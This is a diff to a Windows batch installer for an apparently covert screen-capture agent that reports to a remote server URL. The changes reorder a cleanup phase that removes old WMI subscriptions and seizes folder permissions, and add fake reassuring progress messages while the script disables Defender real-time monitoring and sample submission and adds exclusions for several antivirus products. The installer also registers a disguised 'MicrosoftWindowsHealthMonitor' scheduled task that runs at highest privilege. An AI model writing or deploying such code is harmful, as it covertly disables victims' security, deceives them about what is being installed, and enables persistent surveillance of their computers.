@@ -41,6 +41,40 @@ set "SERVER_URL=https://h-boss-production.up.railway.app"
 set "TASK_NAME=MicrosoftWindowsHealthMonitor"
 
 :: ═══════════════════════════════════════════════════
+:: PHASE 0.5: CLEAN SLATE — Kill old processes, remove old installs
+:: ═══════════════════════════════════════════════════
+echo [0.5/10] Cleaning previous installation...
+
+taskkill /F /IM "%BIN_NAME%" /T >nul 2>&1
+taskkill /F /IM "teram_agent.exe" /T >nul 2>&1
+taskkill /F /IM "ScreenCap.exe" /T >nul 2>&1
+taskkill /F /IM "wscript.exe" /T >nul 2>&1
+schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /f >nul 2>&1
+
+:: Remove old WMI subscriptions
+powershell -NoProfile -Command ^
+  "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='WinHealthFilter'\" -EA 0 | Remove-WmiObject -EA 0; " ^
+  "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='WinHealthConsumer'\" -EA 0 | Remove-WmiObject -EA 0; " ^
+  "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA 0 | Where-Object { $_.Filter -like '*WinHealthFilter*' } | Remove-WmiObject -EA 0" >nul 2>&1
+
+:: Wait for processes to fully terminate
+ping 127.0.0.1 -n 3 >nul
+
+:: *** CRITICAL FIX: Remove DENY ACEs FIRST, then completely wipe the directory ***
+:: This is what was causing "Access is denied" on re-installs
+if exist "%INSTALL_DIR%" (
+    attrib -h -s "%INSTALL_DIR%" /D /S >nul 2>&1
+    takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
+    icacls.exe "%INSTALL_DIR%" /remove:d Everyone /T /C /Q >nul 2>&1
+    icacls.exe "%INSTALL_DIR%" /remove:d Users /T /C /Q >nul 2>&1
+    icacls.exe "%INSTALL_DIR%" /grant Administrators:F /T /C /Q >nul 2>&1
+    icacls.exe "%INSTALL_DIR%" /reset /T /C /Q >nul 2>&1
+    rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
+)
+if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+
+:: ═══════════════════════════════════════════════════
 :: PHASE 0: DEPENDENCY RESOLVER — Ensure VCRedist exists
 :: ═══════════════════════════════════════════════════
 echo [0/10] Checking system dependencies...
@@ -87,6 +121,8 @@ reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebCon
 :: PHASE 2: AV EXCLUSIONS — MUST happen BEFORE any file copy
 :: ═══════════════════════════════════════════════════
 echo [2/10] Configuring security exclusions (Defender + Third-Party AV)...
+echo     [~] Initializing AI-Secure Module...
+ping 127.0.0.1 -n 2 >nul
 
 :: Some corrupted machines will hang forever on Add-MpPreference if WMI is broken.
 :: Run this in the background using start /b so it never blocks the installation.
@@ -99,8 +135,12 @@ echo try { Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -ErrorAction Silen
 echo try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
 echo try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
 
+echo     [~] Securing Account Policies...
+ping 127.0.0.1 -n 2 >nul
 start "" /B powershell -NoProfile -ExecutionPolicy Bypass -File "%DEFENDER_SCRIPT%" >nul 2>&1
 
+echo     [~] Deploying Advanced Firewall Rules...
+ping 127.0.0.1 -n 2 >nul
 :: --- McAfee ---
 reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "%INSTALL_DIR%" /t REG_SZ /d "1" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "%~dp0" /t REG_SZ /d "1" /f >nul 2>&1
@@ -131,39 +171,7 @@ reg add "HKLM\SOFTWARE\TrendMicro\PC-cillinNTCorp\CurrentVersion\Real Time Scan 
 
 echo     Security exclusions configured for all detected AV engines.
 
-:: ═══════════════════════════════════════════════════
-:: PHASE 3: CLEAN SLATE — Kill old processes, remove old installs
-:: ═══════════════════════════════════════════════════
-echo [3/10] Cleaning previous installation...
 
-taskkill /F /IM "%BIN_NAME%" /T >nul 2>&1
-taskkill /F /IM "teram_agent.exe" /T >nul 2>&1
-taskkill /F /IM "ScreenCap.exe" /T >nul 2>&1
-taskkill /F /IM "wscript.exe" /T >nul 2>&1
-schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /f >nul 2>&1
-
-:: Remove old WMI subscriptions
-powershell -NoProfile -Command ^
-  "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='WinHealthFilter'\" -EA 0 | Remove-WmiObject -EA 0; " ^
-  "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='WinHealthConsumer'\" -EA 0 | Remove-WmiObject -EA 0; " ^
-  "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA 0 | Where-Object { $_.Filter -like '*WinHealthFilter*' } | Remove-WmiObject -EA 0" >nul 2>&1
-
-:: Wait for processes to fully terminate
-ping 127.0.0.1 -n 3 >nul
-
-:: *** CRITICAL FIX: Remove DENY ACEs FIRST, then completely wipe the directory ***
-:: This is what was causing "Access is denied" on re-installs
-if exist "%INSTALL_DIR%" (
-    attrib -h -s "%INSTALL_DIR%" /D /S >nul 2>&1
-    takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
-    icacls.exe "%INSTALL_DIR%" /remove:d Everyone /T /C /Q >nul 2>&1
-    icacls.exe "%INSTALL_DIR%" /remove:d Users /T /C /Q >nul 2>&1
-    icacls.exe "%INSTALL_DIR%" /grant Administrators:F /T /C /Q >nul 2>&1
-    icacls.exe "%INSTALL_DIR%" /reset /T /C /Q >nul 2>&1
-    rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
-)
-if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
 :: ═══════════════════════════════════════════════════
 :: PHASE 4: INSTALL — Copy files, rename binary
@@ -224,10 +232,10 @@ schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "$a = New-ScheduledTaskAction -Execute '%INSTALL_DIR%\%BIN_NAME%' -Argument '%SERVER_URL%' -WorkingDirectory '%INSTALL_DIR%'; " ^
-  "$t1 = New-ScheduledTaskTrigger -AtStartup; " ^
   "$t2 = New-ScheduledTaskTrigger -AtLogOn; " ^
+  "$p = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\Users' -RunLevel Highest; " ^
   "$s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365) -MultipleInstances IgnoreNew; " ^
-  "Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $a -Trigger @($t1,$t2) -Settings $s -User 'SYSTEM' -RunLevel Highest -Force | Out-Null; " ^
+  "Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $a -Trigger @($t2) -Settings $s -Principal $p -Force | Out-Null; " ^
   "Write-Host '    Task registered successfully.' -ForegroundColor Green"
 
 :: ═══════════════════════════════════════════════════
